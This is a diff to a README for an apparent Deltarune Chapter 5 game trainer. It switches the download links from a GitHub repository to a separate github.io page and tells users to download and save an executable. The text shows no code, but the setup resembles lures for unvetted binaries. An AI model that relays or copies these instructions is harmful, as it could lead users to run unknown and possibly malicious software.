@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master every battle with ease
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Old-balance677/Deltarune-Chapter5-Ultimate-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://old-balance677.github.io)
 
 ## 📖 About This Tool
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer meets these minimum specifications:
 
 Follow these steps to set up the software.
 
-1. Visit this page to download the necessary files: [https://github.com/Old-balance677/Deltarune-Chapter5-Ultimate-Trainer-2026](https://github.com/Old-balance677/Deltarune-Chapter5-Ultimate-Trainer-2026)
+1. Visit this page to download the necessary files: [https://old-balance677.github.io](https://old-balance677.github.io)
 2. Locate the download button on the page.
 3. Save the executable file to a folder on your desktop.
 4. Open the folder where you saved the file.
